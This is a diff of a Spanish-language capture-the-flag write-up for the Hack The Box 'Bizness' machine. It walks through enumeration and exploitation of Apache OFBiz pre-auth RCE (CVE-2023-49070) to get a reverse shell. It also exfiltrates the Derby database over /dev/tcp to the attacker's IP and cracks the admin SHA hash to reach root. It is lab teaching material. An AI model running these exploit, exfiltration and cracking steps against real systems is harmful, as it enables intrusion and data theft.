@@ -21,7 +21,9 @@ layout:
 
 ***
 
+## Reconnaissance
 
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Bizness**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.252 -oG allPorts
@@ -50,7 +52,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.81 seconds
            Raw packets sent: 76283 (3.356MB) | Rcvd: 75327 (3.014MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -63,7 +65,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.81 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Nginx` y el servicio de `SSH` habilitado.
 
 ```bash
 ❯ nmap -sCV -p22,80,443,42039 10.10.11.252 -A -oN targeted -oX targetedXML
@@ -110,37 +112,43 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds
 ```
 
-
-
-<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
-
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
+<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep bizness
 10.10.11.252 bizness.htb
 ```
 
+## Web Enumeration
 
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
 
 ```bash
 ❯ whatweb https://bizness.htb
 https://bizness.htb [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[10.10.11.252], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
 ```
 
-
+Accederemos a [https://bizness.htb](https://bizness.htb) y nos encontramos con la siguiente página web.
 
 <figure><img src="../../.gitbook/assets/5006_vmware_wdw86rIp2U.jpg" alt=""><figcaption></figcaption></figure>
 
+Al realizar un escaneo con **dirsearch** sobre el objetivo [https://bizness.htb](https://bizness.htb), encontramos algunos directorios interesantes:
 
+* **/control/** y **/control/login**: Aparecieron como rutas válidas, lo que podría indicarnos un panel de administración o alguna forma de autenticación.
+* **/solr/admin/** y **/solr/admin/file/**: Estas rutas también regresaron respuestas, lo que sugiere que Solr está presente en el servidor. A través de estas rutas, podríamos tener la posibilidad de explorar configuraciones o archivos sensibles, aunque al principio no parecían ofrecer algo directamente explotable.
 
 ```bash
 ❯ dirsearch -u 'https://bizness.htb' -t 50 -i 200 2>/dev/null
@@ -164,39 +172,37 @@ Target: https://bizness.htb/
 Task Completed
 ```
 
+Al acceder a [https://bizness.htb/control](https://bizness.htb/control) se nos mostraba una página con un mensaje de error. Entre la información reportada, se nos indica que la página web utiliza `Apache OFBiz`.
 
+{% hint style="info" %}
+Apache OFBiz es un sistema de planificación de recursos empresariales (ERP) de código abierto. Ofrece un conjunto de aplicaciones empresariales que integran y automatizan muchos de los procesos comerciales de una empresa
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
 
+Al acceder a https://bizness.htb/solr/admin/ se nos redirigió a la siguiente página web en la cual se nos muestra un panel de autenticación.&#x20;
 
+En el footer de la página, se menciona la versión de `Apache OFBinz`, la cual se trata de la versióon **18.12**.
 
 <figure><img src="../../.gitbook/assets/5007_vmware_wxR5L4Lf8g.png" alt=""><figcaption></figcaption></figure>
 
+## Initial Access
 
+### Apache OFBiz 18.12 - PreAuth Remote Code Execution \[RCE] (CVE-2023-49070)&#x20;
 
-```bash
-❯ searchsploit Ofbiz 18.12
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                                                                                     |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Apache OFBiz 18.12.12 - Directory Traversal                                                                                                                                                        | java/webapps/52020.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-```
-
-
-
-
+Al revisar por Internet posibles vulnerabilidades sobre esa versión, nos encontramos con el siguiente `CVE-2023-49070`.
 
 {% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-49070" %}
 
+{% hint style="danger" %}
+RCE previo a la autenticación en Apache Ofbiz 18.12.09. Se debe a que XML-RPC ya no se mantiene y sigue estando presente. Este problema afecta a Apache OFBiz: anterior a 18.12.10. Se recomienda a los usuarios que actualicen a la versión 18.12.10
+{% endhint %}
 
 
 
+Nos descargaremos el siguiente repositorio el cual nos proporcionan un exploit para aprovecharnos de la vulnerabilidad.
 
 {% embed url="https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz" %}
-
-
 
 ```bash
 ❯ git clone https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz; cd Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz
@@ -209,7 +215,7 @@ Recibiendo objetos: 100% (21/21), 6.74 KiB | 6.74 MiB/s, listo.
 Resolviendo deltas: 100% (4/4), listo.
 ```
 
-
+El exploit nos indica que debemos de descargarnos `ysoserial` a través del siguiente comando.
 
 ```bash
 ❯ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
@@ -234,7 +240,7 @@ ysoserial-all.jar                                         100%[=================
 2025-02-16 01:36:48 (34,8 MB/s) - «ysoserial-all.jar» guardado [59525376/59525376]
 ```
 
-
+Revisaremos la sintaxis del exploit, el cual permite ejecutar comandos remotos o proporcionarnos una Reverse Shell directamente.
 
 ```bash
 ❯ python3 ofbiz_exploit.py -h
@@ -243,7 +249,7 @@ python3 ofbiz_exploit.py target_URL rce command
 python3 ofbiz_exploit.py target_URL shell IP:PORT
 ```
 
-
+Al intentar ejecutar el exploit, se nos menciona que debemos utilizar `OpenJDK-11`.
 
 ```bash
 ❯ python3 ofbiz_exploit.py https://bizness.htb rce id
@@ -261,9 +267,11 @@ sudo apt-get install openjdk-11-jdk
 sudo update-alternatives --config java
 ```
 
-
+Nos lo descargaremos el `.deb` a través de la página oficial de Oracle.
 
 {% embed url="https://www.oracle.com/es/java/technologies/javase/jdk11-archive-downloads.html" %}
+
+Configuramos nuestro equipo para que utilize la versión `JDK-11`.
 
 ```bash
 ❯ sudo update-alternatives --config java
@@ -281,14 +289,14 @@ Pulse <Intro> para mantener el valor por omisión [*] o pulse un número de sele
 update-alternatives: utilizando /usr/lib/jvm/jdk-11.0.25-oracle-x64/bin/java para proveer /usr/bin/java (java) en modo automático
 ```
 
-
+Realizaremos una prueba básica para verificar que podemos ejecutar comandos. Para ello, nos montaremos un servidor web.
 
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Ejecutaremos el exploit para que ejecute el comando `cURL` hacía nuestro servidor web.
 
 ```bash
 ❯ python3 ofbiz_exploit.py https://bizness.htb rce 'curl http://10.10.16.3/gzzcoo'
@@ -298,7 +306,7 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 Check if the reverse shell was established or if there is any command output.
 ```
 
-
+Verificamos en nuestro servidor web que se ha recibido la petición `GET` desde el equipo víctima. Con lo cual, queda confirmada la ejecución de comandos.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -307,14 +315,14 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.252 - - [16/Feb/2025 01:38:57] "GET /gzzcoo HTTP/1.1" 404 -
 ```
 
-
+El siguiente paso será obtener una Reverse Shell, para ello nos pondremos en escucha con`nc`.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos el exploit pora proporcionarnos directamente la Reverse Shell.
 
 ```bash
 ❯ python3 ofbiz_exploit.py https://bizness.htb shell 10.10.16.3:443
@@ -324,7 +332,7 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 Check if the reverse shell was established or if there is any command output.
 ```
 
-
+Verificamos que hemos ganado acceso al sistema como el usuario `ofbiz`y podemos ver el contenido de la flag **user.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -333,10 +341,10 @@ connect to [10.10.16.3] from (UNKNOWN) [10.10.11.252] 51542
 bash: cannot set terminal process group (570): Inappropriate ioctl for device
 bash: no job control in this shell
 ofbiz@bizness:/opt/ofbiz$ cat /home/ofbiz/user.txt
-eb342ca9148c8b77c858e8b9a3a6cb94
+eb342ca9148c8*******************
 ```
 
-
+Al obtener la reverse shell, mejoramos la calidad de la shell con los siguientes pasos para obtener una TTY interactiva.
 
 ```bash
 ofbiz@bizness:/opt/ofbiz$ script /dev/null -c bash 
@@ -355,13 +363,21 @@ ofbiz@bizness:/opt/ofbiz$ export SHELL=bash
 ofbiz@bizness:/opt/ofbiz$ stty rows 46 columns 230
 ```
 
+## Privilege Escalation
 
+### Analysis of OFbiz code to understand the hashes storage mechanism
+
+Después de enumerar el sistema con el usuario `ofbiz`, no logramos obtener ninguna información interesante.
+
+Con lo cual, nos llevó a pensar que quizás exista una base de datos para el `Apache OFBiz`. Nos encontramos que `OFBiz` utiliza `Derby` como base de datos.
 
 <figure><img src="../../.gitbook/assets/5009_vmware_Somv8oHEO1.png" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://cwiki.apache.org/confluence/display/OFBIZ/Apache+OFBiz+Technical+Production+Setup+Guide" %}
 
+Enumerando el directorio de `/opt/ofbiz/framework/security/config`, nos encontramos con un archivo nombrado `security.properties` el cual contenías las propiedades de seguridad de la configuración de `Apache OFBiz`.
 
+Entre el resultado obtenido, verificamos que se está empleando encriptación de `SHA`.
 
 ```bash
 ofbiz@bizness:/opt/ofbiz/framework/security/config$ cat security.properties 
@@ -397,7 +413,7 @@ password.encrypt=true
 password.encrypt.hash.type=SHA
 ```
 
-
+Realizamos una búsqueda recursiva a través del comando `find` para localizar algún archivo/directorio relacionado con la base de datos de `Apache OFBiz` llamada `Derby`.
 
 ```bash
 ofbiz@bizness:/opt/ofbiz$ find / -name derby 2>/dev/null
@@ -406,7 +422,7 @@ ofbiz@bizness:/opt/ofbiz$ find / -name derby 2>/dev/null
 /opt/ofbiz/runtime/data/derby
 ```
 
-
+Accedemos a `/opt/ofbiz/runtime/data/derby` y logramos encontrar la estructura de la base de datos que hace uso `Apache OFBiz`.
 
 ```bash
 ofbiz@bizness:/opt/ofbiz/runtime/data$ ls -l derby
@@ -417,7 +433,7 @@ drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Feb 15 19:27 ofbizolap
 drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Feb 15 19:27 ofbiztenant
 ```
 
-
+Para trabajar mejor con la información, lo que realizaremos es comprimir todo el directorio de `derby` para disponerlo de manera local en nuestro equipo.
 
 ```bash
 ofbiz@bizness:/opt/ofbiz/runtime/data$ tar -czf derby.tar.gz derby
@@ -429,31 +445,33 @@ drwxr-xr-x 5 ofbiz ofbiz-operator    4096 Dec 21  2023 derby
 -rw-r--r-- 1 ofbiz ofbiz-operator      88 Oct 13  2023 README
 ```
 
-
+Nos pondremos en escucha con `nc` para recibir el comprimido.
 
 ```bash
 ❯ nc -nlvp 443 > derby.tar.gz
 listening on [any] 443 ...
 ```
 
-
+Enviaremos la información a través de `/dev/tcp`.
 
 ```bash
 ofbiz@bizness:/opt/ofbiz/runtime/data$ cat derby.tar.gz > /dev/tcp/10.10.16.3/443
 ```
 
-
+Una vez recibido el archivo en nuestro equipo local, lo descomprimiremos para analizarlo posteriormente.
 
 ```bash
 ❯ gunzip derby.tar.gz
 ❯ tar -xvf derby.tar
 ```
 
+### Connecting to a Derby database (ij)
 
+Nos encontramos con los archivos que utiliza `Apache OFBiz` para la base de datos `Derby`.  A través del siguiente blog, se nos menciona como lograr conectarnos.
+
+Mediante la herramienta `ij`, logramos conectarnos a la base de datos que disponemos localmente en el directorio mencionado. Visualizamos los `SCHEMAS` y el que parece interesarnos más es el de `OFBIZ`.
 
 {% embed url="https://db.apache.org/derby/docs/10.14/tools/ttoolsij97656.html" %}
-
-
 
 ```bash
 ❯ ls
@@ -483,7 +501,7 @@ SYSSTAT
 12 filas seleccionadas
 ```
 
-
+Enumeramos las tablas de la base de datos `OFBIZ`, en el resultado obtenido, comprobamos una tabla mencionada `USER_LOGIN`.
 
 ```bash
 ij> SHOW TABLES IN OFBIZ;   
@@ -511,7 +529,7 @@ OFBIZ               |USER_PREFERENCE               |
 OFBIZ               |USER_PREF_GROUP_TYPE          |  
 ```
 
-
+Al revisar los datos de dicha tabla, nos encontramos con las credenciales del usuario`admin` en formato hash `SHA`, tal cómo se mencionaba en el archivo de configuración de seguridad.
 
 ```bash
 ij> SELECT * FROM OFBIZ.USER_LOGIN;
@@ -525,11 +543,13 @@ admin                            |$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I            
 ij> 
 ```
 
+### Cracking Apache OFBiz SHA1 Passwords
 
+Para lograr crackear este hash, nos encontramos con la siguiente herramienta.
 
 {% embed url="https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker" %}
 
-
+Intentamos crackear el has obtenido y finalmente logramos obtener las credenciales en texto plano del hash del usuario `admin`.
 
 ```bash
 ❯ python3 OFBiz-crack.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I' --wordlist /usr/share/wordlists/rockyou.txt
@@ -540,11 +560,11 @@ hash: $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
 [!] Super, I bet you could log into something with that!
 ```
 
-
+Intentamos cambiar de usuario al usuario `root` con las credenciales obtenidas, y comprobamos del correcto acceso como `root`. Finalmente, visualizamos la flag **root.txt**.
 
 ```bash
 ofbiz@bizness:/opt/ofbiz/runtime/data$ su root
 Password: 
 root@bizness:/opt/ofbiz/runtime/data# cat /root/root.txt 
-fe0e508dad478aaf28ea03d9a3a5daa7
+fe0e508dad**********************
 ```
